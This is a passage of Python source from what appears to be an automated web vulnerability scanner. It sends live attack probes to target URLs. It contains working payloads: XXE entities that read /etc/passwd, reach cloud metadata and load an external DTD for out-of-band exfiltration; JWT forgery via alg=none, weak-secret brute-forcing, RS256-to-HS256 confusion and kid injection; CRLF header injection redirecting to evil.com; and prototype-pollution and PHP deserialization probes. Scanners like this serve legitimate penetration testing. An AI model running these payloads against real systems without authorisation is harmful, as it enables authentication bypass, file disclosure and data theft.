             "XXE SSRF AWS Metadata",     "SSRF via XXE to AWS metadata"),
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1/admin">]><r>&x;</r>',
             "XXE SSRF localhost",         "SSRF via XXE to internal admin"),
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://[::1]/">]><r>&x;</r>',
             "XXE SSRF IPv6",              "SSRF via XXE using IPv6 loopback"),
            # ── Java-specific ─────────────────────────────────────────────────
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "jar:file:///var/lib/tomcat/webapps/!/WEB-INF/web.xml">]><r>&x;</r>',
             "XXE Java jar://",            "Java jar:// reads files inside archives"),
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "netdoc:///etc/passwd">]><r>&x;</r>',
             "XXE netdoc://",              "Java netdoc:// alternative to file://"),
            # ── Blind OOB via external DTD ────────────────────────────────────
            ('<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://y2s-xxe-oob.invalid/evil.dtd"><r/>',
             "Blind XXE external DTD",     "Blind OOB exfiltration via external DTD load"),
            # ── FTP exfiltration ──────────────────────────────────────────────
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "ftp://y2s-xxe-oob.invalid/test">]><r>&x;</r>',
             "XXE FTP exfil",              "FTP protocol used for OOB data exfiltration"),
            # ── UTF-16 WAF bypass ─────────────────────────────────────────────
            ('<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
             "XXE UTF-16 bypass",          "UTF-16 encoding bypasses WAF signature matching"),
            # ── Billion laughs DoS probe ──────────────────────────────────────
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "y2s"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]><r>&b;&b;&b;&b;&b;</r>',
             "XXE Entity Expansion DoS",   "Recursive entity expansion — detect parser limits"),
        ]

        # High-confidence file content signatures
        self.signatures = [
            r"root:x:0:0:",
            r"root:\*:0:0:",
            r"daemon:x:\d+:\d+:",
            r"www-data:x:\d+:\d+:",
            r"nobody:x:\d+:\d+:",
            r"127\.0\.0\.1\s+localhost",
            r"::1\s+localhost",
            r"\[extensions\]\s*\r?\n",
            r"for 16-bit app support",
            r"\[boot loader\]",
            r"DOCUMENT_ROOT=/",
            r"HTTP_USER_AGENT=Mozilla",
            r"^[A-Za-z0-9+/]{200,}={0,2}$",  # base64 PHP source (long block)
        ]

        # XML error patterns — secondary evidence (not enough alone)
        self.error_patterns = [
            r"xml.*?parse.*?error",
            r"SAXParseException",
            r"XMLSyntaxError",
            r"no such file or directory",
            r"failed to open stream",
            r"entity.*?not.*?defined",
        ]

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)

            # Fetch baseline once
            try:
                baseline = await client.get(url, timeout=self.config.vuln_timeout,
                                            follow_redirects=True)
                baseline_text = baseline.text
            except Exception:
                return vulns

            for payload_xml, subtype, impact in self.payloads:
                found = False
                # ── Strategy 1: POST with XML body ────────────────────────────
                for ct in ["application/xml", "text/xml", "application/soap+xml"]:
                    if found:
                        break
                    try:
                        hdrs = random_headers(include_device_hints=False)
                        hdrs["Content-Type"] = ct
                        resp = await client.post(
                            url, content=payload_xml.encode(),
                            headers=hdrs, timeout=self.config.vuln_timeout,
                            follow_redirects=True
                        )
                        body = resp.text
                        for sig in self.signatures:
                            if re.search(sig, body, re.IGNORECASE | re.MULTILINE) \
                               and not re.search(sig, baseline_text, re.IGNORECASE | re.MULTILINE):
                                vulns.append(VulnerabilityResult(
                                    url=url,
                                    vulnerability_type=VulnerabilityType.XXE,
                                    severity="CRITICAL",
                                    vulnerable_params=["XML POST body"],
                                    payload_used=payload_xml[:120] + "...",
                                    evidence=f"XXE confirmed (POST {ct}) — file content signature '{sig[:40]}' in response",
                                    details="Server parsed XML external entity — arbitrary file read possible",
                                    subtype=subtype,
                                    impact=impact,
                                ))
                                return vulns
                    except Exception:
                        continue

                # ── Strategy 2: Inject into URL params that look XML-ish ──────
                params = urllib.parse.parse_qs(parsed.query)
                xml_params = {k: v for k, v in params.items()
                              if any(w in k.lower() for w in ['xml', 'data', 'body', 'input',
                                                               'payload', 'content', 'soap', 'request'])}
                for param in list(xml_params.keys())[:3]:
                    if found:
                        break
                    try:
                        tp = params.copy()
                        tp[param] = [payload_xml]
                        tq = urllib.parse.urlencode(tp, doseq=True)
                        tu = urllib.parse.urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, tq, parsed.fragment
                        ))
                        resp = await client.get(tu, timeout=self.config.vuln_timeout,
                                                follow_redirects=True)
                        body = resp.text
                        for sig in self.signatures:
                            if re.search(sig, body, re.IGNORECASE | re.MULTILINE) \
                               and not re.search(sig, baseline_text, re.IGNORECASE | re.MULTILINE):
                                vulns.append(VulnerabilityResult(
                                    url=url,
                                    vulnerability_type=VulnerabilityType.XXE,
                                    severity="CRITICAL",
                                    vulnerable_params=[param],
                                    payload_used=payload_xml[:120] + "...",
                                    evidence=f"XXE via GET param '{param}' — file signature detected",
                                    details=f"Parameter '{param}' passed to XML parser without sanitization",
                                    subtype=subtype,
                                    impact=impact,
                                ))
                                found = True
                                return vulns
                    except Exception:
                        continue

        except Exception:
            pass
        return vulns


class DirectoryListingScanner:
    """Detects exposed directory listings (Apache/Nginx Index Of)."""

    def __init__(self, config: Config):
        self.config = config

        self._dirs = [
            "/", "/uploads/", "/upload/", "/files/", "/file/",
            "/static/", "/assets/", "/media/", "/images/", "/img/",
            "/backup/", "/backups/", "/data/", "/db/", "/database/",
            "/logs/", "/log/", "/temp/", "/tmp/", "/cache/",
            "/includes/", "/include/", "/inc/", "/lib/", "/libs/",
            "/src/", "/source/", "/js/", "/css/", "/fonts/",
            "/admin/", "/api/", "/v1/", "/v2/",
            "/downloads/", "/download/", "/export/",
            "/config/", "/configs/", "/conf/",
            "/private/", "/secret/", "/hidden/",
            "/old/", "/archive/", "/archived/",
            "/test/", "/tests/", "/dev/", "/stage/",
            "/storage/", "/store/", "/public/",
        ]

        # Must match: confirms directory listing is enabled
        self._listing_sigs = [
            r"<title>\s*Index of\s*/",
            r"<h1>\s*Index of\s*/",
            r"Directory listing for\s*/",
            r"\[To Parent Directory\]",
            r"<pre>\s*.*Parent Directory",
        ]

        # Must also match: confirms real file entries exist (not just text)
        self._entry_sigs = [
            r'href="[^"]*\.(php|html?|js|css|txt|zip|tar|gz|sql|bak|log|xml|json|env|conf|cfg|ini|py|rb|sh|asp|aspx|jsp)"',
            r'href="\.\./?"',             # parent dir link
            r'<td[^>]*>\s*\d+[-/]\d+',   # date column typical in listings
        ]

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"

            # Canary: get the site's real 404 page to skip false matches
            try:
                _404 = await client.get(
                    base + f"/{uuid.uuid4().hex}_y2s_dl_canary/",
                    timeout=6, follow_redirects=True
                )
                _404_body = _404.text
            except Exception:
                _404_body = ""

            for dir_path in self._dirs:
                try:
                    target = base + dir_path
                    resp = await client.get(target, timeout=8, follow_redirects=True)

                    if resp.status_code != 200:
                        continue

                    body = resp.text

                    # Skip if same as 404 page (soft-404 server)
                    if _404_body and len(_404_body) > 50:
                        ratio = min(len(body), len(_404_body)) / max(len(body), len(_404_body), 1)
                        if ratio > 0.90:
                            continue

                    # Must match a listing signature
                    listing_match = next(
                        (sig for sig in self._listing_sigs if re.search(sig, body, re.IGNORECASE)),
                        None
                    )
                    if not listing_match:
                        continue

                    # Must also have file entry links (eliminates text-only matches)
                    has_entries = any(re.search(e, body, re.IGNORECASE) for e in self._entry_sigs)
                    if not has_entries:
                        continue

                    # Severity: sensitive dirs → HIGH, others → MEDIUM
                    _sensitive = any(s in dir_path for s in [
                        'backup', 'db', 'database', 'config', 'conf',
                        'log', 'admin', 'secret', 'private', 'hidden', 'old',
                    ])
                    severity = "HIGH" if _sensitive else "MEDIUM"

                    # Count visible files for evidence
                    file_count = len(re.findall(r'href="[^"]+\.[a-z]{2,4}"', body, re.IGNORECASE))

                    vulns.append(VulnerabilityResult(
                        url=target,
                        vulnerability_type=VulnerabilityType.DIRLIST,
                        severity=severity,
                        vulnerable_params=[dir_path],
                        payload_used=f"GET {dir_path}",
                        evidence=f"Directory listing enabled — ~{file_count} file(s) visible, matched '{listing_match[:50]}'",
                        details=f"Directory '{dir_path}' exposes full file listing — no authentication required",
                        subtype="Directory Listing" + (" (Sensitive)" if _sensitive else ""),
                        impact="Attacker can enumerate all files — may expose source code, backups, credentials, or config files",
                    ))

                except Exception:
                    continue
        except Exception:
            pass
        return vulns


class JWTScanner:
    """Tests for JWT vulnerabilities: alg=none, weak secret, expired acceptance."""

    _WEAK_SECRETS = [
        "secret", "password", "123456", "qwerty", "admin", "test",
        "changeme", "letmein", "welcome", "abc123", "pass", "key",
        "mysecret", "jwt_secret", "app_secret", "super_secret",
        "your-256-bit-secret", "your-secret", "secret_key", "secretkey",
        "private", "private_key", "hs256", "hmacsha256", "token",
        "", "null", "jwt", "auth", "sign", "verify",
        "secret123", "password123", "jwt-secret", "my-secret",
        "development", "production", "staging", "localhost",
        "SuperSecret", "MySecret", "ChangeMe", "Replace_Me",
        "1234567890", "abcdefgh", "test123", "api_key",
        "thisisasecret", "notsosecret", "reallysecret",
        "your_jwt_secret", "jwt_private_key", "app_key",
    ]

    def __init__(self, config: Config):
        self.config = config

    def _extract_jwts(self, headers: dict, body: str) -> List[str]:
        tokens = []
        auth = headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            tokens.append(auth[7:].strip())
        for v in headers.values():
            for part in str(v).split():
                if re.match(r'^eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$', part):
                    tokens.append(part)
        for m in re.finditer(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*', body):
            tokens.append(m.group())
        return list(set(tokens))

    def _decode_part(self, part: str) -> dict:
        try:
            pad = 4 - len(part) % 4
            decoded = base64.urlsafe_b64decode(part + "=" * pad)
            return json.loads(decoded)
        except Exception:
            return {}

    def _forge_none_token(self, token: str) -> str:
        parts = token.split(".")
        if len(parts) != 3:
            return ""
        header = self._decode_part(parts[0])
        payload = self._decode_part(parts[1])
        header["alg"] = "none"
        # Modify payload: remove exp, set admin-like claims
        payload.pop("exp", None)
        for k in list(payload.keys()):
            if "role" in k.lower() or "admin" in k.lower() or "type" in k.lower():
                payload[k] = "admin"
        new_header = base64.urlsafe_b64encode(
            json.dumps(header, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()
        new_payload = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()
        return f"{new_header}.{new_payload}."

    def _forge_hs256_with_secret(self, token: str, secret: str) -> str:
        try:
            import hmac as _hmac
            parts = token.split(".")
            header = self._decode_part(parts[0])
            payload = self._decode_part(parts[1])
            header["alg"] = "HS256"
            payload.pop("exp", None)
            new_header = base64.urlsafe_b64encode(
                json.dumps(header, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()
            new_payload = base64.urlsafe_b64encode(
                json.dumps(payload, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()
            signing_input = f"{new_header}.{new_payload}"
            sig = _hmac.new(secret.encode(), signing_input.encode(), "sha256").digest()
            new_sig = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
            return f"{signing_input}.{new_sig}"
        except Exception:
            return ""

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            # Fetch page to collect any JWT in response
            resp = await client.get(url, timeout=self.config.vuln_timeout,
                                    follow_redirects=self.config.follow_redirects)
            resp_headers = {k.lower(): v for k, v in resp.headers.items()}
            tokens = self._extract_jwts(resp_headers, resp.text)

            if not tokens:
                return vulns

            for token in tokens[:3]:
                header_data = self._decode_part(token.split(".")[0])
                payload_data = self._decode_part(token.split(".")[1])
                alg = header_data.get("alg", "unknown").upper()

                # ── Test 1: algorithm=none ────────────────────────────────────
                none_token = self._forge_none_token(token)
                if none_token:
                    for alg_variant in ["none", "None", "NONE", "nOnE"]:
                        try:
                            parts = none_token.split(".")
                            h = self._decode_part(parts[0])
                            h["alg"] = alg_variant
                            new_h = base64.urlsafe_b64encode(
                                json.dumps(h, separators=(",", ":")).encode()
                            ).rstrip(b"=").decode()
                            test_tok = f"{new_h}.{parts[1]}."
                            test_hdrs = random_headers()
                            test_hdrs["Authorization"] = f"Bearer {test_tok}"
                            r = await client.get(url, headers=test_hdrs,
                                                 timeout=self.config.vuln_timeout,
                                                 follow_redirects=self.config.follow_redirects)
                            # If we get same 200 response with modified token → vulnerable
                            if r.status_code == resp.status_code and r.status_code == 200:
                                if abs(len(r.text) - len(resp.text)) < len(resp.text) * 0.1:
                                    vulns.append(VulnerabilityResult(
                                        url=url,
                                        vulnerability_type=VulnerabilityType.JWT,
                                        severity="CRITICAL",
                                        vulnerable_params=["Authorization header"],
                                        payload_used=f"alg={alg_variant}, empty signature",
                                        evidence=f"Server accepted JWT with alg='{alg_variant}' and empty signature — algorithm not validated",
                                        details="JWT algorithm confusion: server accepts unsigned tokens (alg=none)",
                                        subtype="JWT alg=none Bypass",
                                        impact="Attacker can forge arbitrary JWT tokens without knowing the secret — full authentication bypass",
                                    ))
                                    return vulns
                        except Exception:
                            continue

                # ── Test 2: Weak secret brute-force (HS256 only) ──────────────
                if alg == "HS256":
                    for secret in self._WEAK_SECRETS:
                        forged = self._forge_hs256_with_secret(token, secret)
                        if not forged:
                            continue
                        try:
                            test_hdrs = random_headers()
                            test_hdrs["Authorization"] = f"Bearer {forged}"
                            r = await client.get(url, headers=test_hdrs,
                                                 timeout=self.config.vuln_timeout,
                                                 follow_redirects=self.config.follow_redirects)
                            if r.status_code == 200 and abs(len(r.text) - len(resp.text)) < len(resp.text) * 0.1:
                                vulns.append(VulnerabilityResult(
                                    url=url,
                                    vulnerability_type=VulnerabilityType.JWT,
                                    severity="CRITICAL",
                                    vulnerable_params=["Authorization header"],
                                    payload_used=f"Weak secret: '{secret}'",
                                    evidence=f"Server accepted JWT signed with weak secret '{secret}'",
                                    details="JWT uses a guessable/weak HMAC secret",
                                    subtype="JWT Weak Secret",
                                    impact="Attacker can sign arbitrary tokens and impersonate any user including admins",
                                ))
                                return vulns
                        except Exception:
                            continue

                # ── Test 3: Expired token acceptance ──────────────────────────
                exp = payload_data.get("exp", 0)
                if exp and exp < time.time():
                    try:
                        test_hdrs = random_headers()
                        test_hdrs["Authorization"] = f"Bearer {token}"
                        r = await client.get(url, headers=test_hdrs,
                                             timeout=self.config.vuln_timeout,
                                             follow_redirects=self.config.follow_redirects)
                        if r.status_code == 200:
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.JWT,
                                severity="HIGH",
                                vulnerable_params=["Authorization header"],
                                payload_used=f"Expired JWT (exp={exp})",
                                evidence=f"Server returned 200 OK for JWT expired at timestamp {exp} — expiry not enforced",
                                details="JWT expiration (exp claim) is not validated server-side",
                                subtype="JWT Expired Token Accepted",
                                impact="Old/stolen tokens remain valid indefinitely — session revocation is impossible",
                            ))
                            return vulns
                    except Exception:
                        pass

        except Exception:
            pass

        # ── Test 4: RS256 → HS256 algorithm confusion ─────────────────────────
        for token in tokens[:2]:
            parts = token.split(".")
            if len(parts) != 3: continue
            hdr_data = self._decode_part(parts[0])
            if hdr_data.get("alg","").upper() != "RS256": continue
            try:
                import hmac as _h
                new_hdr = base64.urlsafe_b64encode(
                    json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")).encode()
                ).rstrip(b"=").decode()
                for sec in [b"", b"secret", b"public_key", b"none"]:
                    sig = _h.new(sec, f"{new_hdr}.{parts[1]}".encode(), "sha256").digest()
                    fg  = f"{new_hdr}.{parts[1]}." + base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
                    th  = random_headers(); th["Authorization"] = f"Bearer {fg}"
                    try:
                        r2 = await client.get(url, headers=th, timeout=8,
                                              follow_redirects=self.config.follow_redirects)
                        if r2.status_code == resp.status_code == 200 and                            abs(len(r2.text) - len(resp.text)) < len(resp.text) * 0.15:
                            vulns.append(VulnerabilityResult(
                                url=url, vulnerability_type=VulnerabilityType.JWT_CONF,
                                severity="CRITICAL", vulnerable_params=["Authorization"],
                                payload_used=f"RS256→HS256, secret={sec!r}",
                                evidence=f"Server accepted HS256 token signed with {sec!r}",
                                details="Algorithm confusion: RS256 public cert used as HS256 HMAC secret",
                                subtype="JWT RS256→HS256 Confusion",
                                impact="Forge any JWT without the private key — full auth bypass",
                            )); return vulns
                    except Exception: pass
            except Exception: pass
        # ── Test 5: kid header injection ─────────────────────────────────────
        for token in tokens[:2]:
            parts = token.split(".")
            if len(parts) != 3: continue
            for kid_val in ["../../dev/null", "/dev/null",
                            "' UNION SELECT '1'--", "../../../etc/passwd"]:
                try:
                    import hmac as _h2
                    ih = base64.urlsafe_b64encode(
                        json.dumps({"alg":"HS256","typ":"JWT","kid":kid_val},
                                   separators=(",",":")).encode()
                    ).rstrip(b"=").decode()
                    sig2 = _h2.new(b"", f"{ih}.{parts[1]}".encode(), "sha256").digest()
                    fg2  = f"{ih}.{parts[1]}." + base64.urlsafe_b64encode(sig2).rstrip(b"=").decode()
                    th2  = random_headers(); th2["Authorization"] = f"Bearer {fg2}"
                    r3   = await client.get(url, headers=th2, timeout=8,
                                            follow_redirects=self.config.follow_redirects)
                    if r3.status_code == 200 and resp.status_code == 200 and                        abs(len(r3.text) - len(resp.text)) < len(resp.text) * 0.15:
                        vulns.append(VulnerabilityResult(
                            url=url, vulnerability_type=VulnerabilityType.JWT,
                            severity="CRITICAL", vulnerable_params=["JWT kid header"],
                            payload_used=f"kid={kid_val}",
                            evidence="Forged JWT with malicious kid accepted by server",
                            details="kid parameter used unsanitized in key lookup — path traversal or SQLi",
                            subtype="JWT kid Header Injection",
                            impact="Signature bypass via kid path traversal or SQL injection",
                        )); return vulns
                except Exception: pass
        return vulns


class GraphQLScanner:
    """Detects GraphQL introspection, batch abuse, field suggestions, and depth limits."""

    _ENDPOINTS = [
        "/graphql", "/graphql/", "/api/graphql", "/api/graphql/",
        "/v1/graphql", "/v2/graphql", "/query", "/gql",
        "/graphql/console", "/graphiql", "/playground",
        "/api/v1/graphql", "/api/v2/graphql",
    ]

    _INTROSPECTION_QUERY = '{"query":"{__schema{queryType{name}types{name kind}}}"}'
    _FIELD_SUGGESTION_QUERY = '{"query":"{__typo__}"}'
    _BATCH_QUERY = '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]'
    _DEPTH_QUERY = '{"query":"{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{__typename}}}}}}}}}}}}}}}}}}"}'

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"

            for endpoint in self._ENDPOINTS:
                target = base + endpoint
                try:
                    hdrs = random_headers()
                    hdrs["Content-Type"] = "application/json"

                    # ── Test 1: Introspection enabled ────────────────────────
                    r = await client.post(target, content=self._INTROSPECTION_QUERY.encode(),
                                         headers=hdrs, timeout=8, follow_redirects=True)
                    body = r.text
                    if r.status_code == 200 and "__schema" in body and "queryType" in body:
                        type_count = body.count('"name"')
                        vulns.append(VulnerabilityResult(
                            url=target,
                            vulnerability_type=VulnerabilityType.GRAPHQL,
                            severity="HIGH",
                            vulnerable_params=[endpoint],
                            payload_used=self._INTROSPECTION_QUERY,
                            evidence=f"GraphQL introspection enabled — full schema exposed ({type_count} name fields)",
                            details="GraphQL introspection is enabled in production — full API schema is discoverable",
                            subtype="GraphQL Introspection Enabled",
                            impact="Attacker can enumerate all types, queries, mutations, and fields — complete API map exposed",
                        ))

                    # ── Test 2: Field suggestions leaking schema ──────────────
                    r2 = await client.post(target, content=self._FIELD_SUGGESTION_QUERY.encode(),
                                          headers=hdrs, timeout=8, follow_redirects=True)
                    if r2.status_code in (200, 400) and "Did you mean" in r2.text:
                        vulns.append(VulnerabilityResult(
                            url=target,
                            vulnerability_type=VulnerabilityType.GRAPHQL,
                            severity="MEDIUM",
                            vulnerable_params=[endpoint],
                            payload_used=self._FIELD_SUGGESTION_QUERY,
                            evidence=f"GraphQL field suggestions active — 'Did you mean' hint in error response",
                            details="GraphQL error messages reveal field names via spelling suggestions",
                            subtype="GraphQL Field Suggestions Leaking Schema",
                            impact="Attacker can enumerate field/type names without introspection by probing typos",
                        ))

                    # ── Test 3: Batch query abuse (no rate limit per batch) ───
                    r3 = await client.post(target, content=self._BATCH_QUERY.encode(),
                                          headers=hdrs, timeout=8, follow_redirects=True)
                    if r3.status_code == 200 and r3.text.strip().startswith("["):
                        try:
                            batch_resp = json.loads(r3.text)
                            if isinstance(batch_resp, list) and len(batch_resp) >= 5:
                                vulns.append(VulnerabilityResult(
                                    url=target,
                                    vulnerability_type=VulnerabilityType.GRAPHQL,
                                    severity="MEDIUM",
                                    vulnerable_params=[endpoint],
                                    payload_used=self._BATCH_QUERY[:80] + "...",
                                    evidence=f"Server processed {len(batch_resp)} batched queries in single request",
                                    details="GraphQL batch queries accepted — can be used to bypass rate limiting",
                                    subtype="GraphQL Batch Query Abuse",
                                    impact="Attacker can bypass rate limits, brute-force tokens, or launch DoS via batch amplification",
                                ))
                        except Exception:
                            pass

                    # ── Test 4: Unrestricted query depth ─────────────────────
                    r4 = await client.post(target, content=self._DEPTH_QUERY.encode(),
                                          headers=hdrs, timeout=8, follow_redirects=True)
                    if r4.status_code == 200 and "__typename" in r4.text:
                        vulns.append(VulnerabilityResult(
                            url=target,
                            vulnerability_type=VulnerabilityType.GRAPHQL,
                            severity="MEDIUM",
                            vulnerable_params=[endpoint],
                            payload_used=self._DEPTH_QUERY[:60] + "...",
                            evidence="Server processed deeply nested query (depth=17) without restriction",
                            details="No query depth limit — deeply nested queries accepted",
                            subtype="GraphQL Unrestricted Query Depth",
                            impact="Attacker can craft exponentially deep queries causing DoS (GraphQL batching bomb)",
                        ))

                    if vulns:
                        return vulns

                except Exception:
                    continue
        except Exception:
            pass
        return vulns


class CRLFScanner:
    """Detects CRLF injection in HTTP headers via URL parameters."""

    _PAYLOADS = [
        "%0d%0aX-Y2S-CRLF: injected",
        "%0aX-Y2S-CRLF: injected",
        "%0d%0a%20X-Y2S-CRLF: injected",
        "%E5%98%8D%E5%98%8AX-Y2S-CRLF: injected",  # Unicode CRLF
        "%0d%0aSet-Cookie: y2s_crlf=injected; Path=/",
        "%0d%0aLocation: https://evil.com",
        "\r\nX-Y2S-CRLF: injected",
        "%0d%0aContent-Length: 0%0d%0a%0d%0a",
        "%23%0d%0aX-Y2S-CRLF: injected",           # after #
        "%3f%0d%0aX-Y2S-CRLF: injected",            # after ?
    ]

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)

            for payload in self._PAYLOADS:
                # ── Test 1: Inject in URL params ──────────────────────────────
                for param_name in (list(params.keys())[:5] or ["q", "search", "page"]):
                    try:
                        tp = params.copy()
                        tp[param_name] = [f"test{payload}"]
                        tq = urllib.parse.urlencode(tp, doseq=True)
                        test_url = urllib.parse.urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, tq, parsed.fragment
                        ))
                        r = await client.get(test_url, timeout=8, follow_redirects=False)
                        resp_headers = {k.lower(): v for k, v in r.headers.items()}

                        # Check if our injected header appears
                        if "x-y2s-crlf" in resp_headers:
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.CRLF,
                                severity="HIGH",
                                vulnerable_params=[param_name],
                                payload_used=payload,
                                evidence=f"Injected header 'X-Y2S-CRLF' found in response headers — CRLF injection confirmed",
                                details=f"Parameter '{param_name}' allows CRLF injection into HTTP response headers",
                                subtype="CRLF Header Injection",
                                impact="Attacker can inject arbitrary headers, Set-Cookie, redirect responses, or split HTTP responses",
                            ))
                            return vulns

                        # Check for Location redirect to evil.com
                        if "location" in resp_headers and "evil.com" in resp_headers["location"].lower():
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.CRLF,
                                severity="HIGH",
                                vulnerable_params=[param_name],
                                payload_used=payload,
                                evidence=f"CRLF injected Location header: {resp_headers['location'][:80]}",
                                details=f"CRLF injection via '{param_name}' allows header injection + redirect",
                                subtype="CRLF → Open Redirect",
                                impact="Header injection enabling redirect hijacking and response splitting",
                            ))
                            return vulns

                        # Check injected Set-Cookie
                        set_cookie = resp_headers.get("set-cookie", "")
                        if "y2s_crlf" in set_cookie.lower():
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.CRLF,
                                severity="HIGH",
                                vulnerable_params=[param_name],
                                payload_used=payload,
                                evidence=f"CRLF-injected Set-Cookie confirmed: {set_cookie[:80]}",
                                details=f"CRLF injection via '{param_name}' allows arbitrary cookie injection",
                                subtype="CRLF → Cookie Injection",
                                impact="Attacker can inject session cookies — session fixation and XSS escalation possible",
                            ))
                            return vulns

                    except Exception:
                        continue

                # ── Test 2: Inject in URL path ────────────────────────────────
                try:
                    test_path = parsed.path.rstrip("/") + payload
                    test_url2 = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, test_path,
                        parsed.params, parsed.query, parsed.fragment
                    ))
                    r2 = await client.get(test_url2, timeout=8, follow_redirects=False)
                    if "x-y2s-crlf" in {k.lower() for k in r2.headers.keys()}:
                        vulns.append(VulnerabilityResult(
                            url=url,
                            vulnerability_type=VulnerabilityType.CRLF,
                            severity="HIGH",
                            vulnerable_params=["URL path"],
                            payload_used=payload,
                            evidence="CRLF injection via URL path — injected header confirmed in response",
                            details="URL path allows CRLF injection into HTTP response headers",
                            subtype="CRLF Path Injection",
                            impact="Response header injection enabling HTTP response splitting",
                        ))
                        return vulns
                except Exception:
                    pass

        except Exception:
            pass
        return vulns


class PrototypePollutionScanner:
    """Detects prototype pollution in server-side JavaScript (Node.js) apps."""

    _MARKER = "y2s_pp_probe"

    _JSON_PAYLOADS = [
        {"__proto__": {_MARKER: "1"}},
        {"constructor": {"prototype": {_MARKER: "1"}}},
        {"__proto__": {"y2s_admin": "true", "y2s_role": "admin"}},
        {"__proto__": {"isAdmin": True}},
    ]

    _PARAM_PAYLOADS = [
        f"__proto__[{_MARKER}]=1",
        f"constructor[prototype][{_MARKER}]=1",
        f"__proto__[isAdmin]=true",
        f"__proto__[y2s_role]=admin",
    ]

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)

            # ── Test 1: JSON POST body pollution ──────────────────────────────
            for jpl in self._JSON_PAYLOADS:
                try:
                    hdrs = random_headers()
                    hdrs["Content-Type"] = "application/json"
                    baseline = await client.post(url, content=json.dumps({"test": "value"}).encode(),
                                                 headers=hdrs, timeout=self.config.vuln_timeout,
                                                 follow_redirects=True)
                    r = await client.post(url, content=json.dumps(jpl).encode(),
                                         headers=hdrs, timeout=self.config.vuln_timeout,
                                         follow_redirects=True)
                    body = r.text

                    if self._MARKER in body and self._MARKER not in baseline.text:
                        vulns.append(VulnerabilityResult(
                            url=url,
                            vulnerability_type=VulnerabilityType.PROTOTYPE,
                            severity="HIGH",
                            vulnerable_params=["JSON body"],
                            payload_used=json.dumps(jpl)[:100],
                            evidence=f"Pollution marker '{self._MARKER}' reflected in response — prototype chain modified",
                            details="Server-side prototype pollution via JSON POST body — object properties merged without sanitization",
                            subtype="Prototype Pollution (JSON)",
                            impact="Attacker can modify JavaScript object prototypes — may escalate to RCE, auth bypass, or DoS",
                        ))
                        return vulns
                except Exception:
                    continue

            # ── Test 2: URL query param pollution ─────────────────────────────
            params = urllib.parse.parse_qs(parsed.query)
            for ppl in self._PARAM_PAYLOADS:
                try:
                    # Append proto payload directly to query string
                    sep = "&" if parsed.query else ""
                    test_url = url + sep + ppl if "?" in url else url + "?" + ppl
                    baseline2 = await client.get(url, timeout=self.config.vuln_timeout,
                                                 follow_redirects=True)
                    r2 = await client.get(test_url, timeout=self.config.vuln_timeout,
                                          follow_redirects=True)
                    if self._MARKER in r2.text and self._MARKER not in baseline2.text:
                        vulns.append(VulnerabilityResult(
                            url=url,
                            vulnerability_type=VulnerabilityType.PROTOTYPE,
                            severity="HIGH",
                            vulnerable_params=["URL query string"],
                            payload_used=ppl,
                            evidence=f"Pollution probe '{self._MARKER}' appeared in response from GET param",
                            details="Prototype pollution via GET parameters — qs library parsing without sanitization",
                            subtype="Prototype Pollution (GET params)",
                            impact="JavaScript object prototype modified — potential auth bypass or RCE escalation",
                        ))
                        return vulns
                except Exception:
                    continue

        except Exception:
            pass
        return vulns


class InsecureDeserializationScanner:
    """Detects insecure deserialization in PHP, Java, Python (pickle), and Node.js."""

    def __init__(self, config: Config):
        self.config = config

        # PHP object injection probes
        self._php_payloads = [
            'O:8:"stdClass":0:{}',
            'a:1:{s:4:"test";s:4:"test";}',
            'O:1:"A":1:{s:1:"x";s:3:"rce";}',
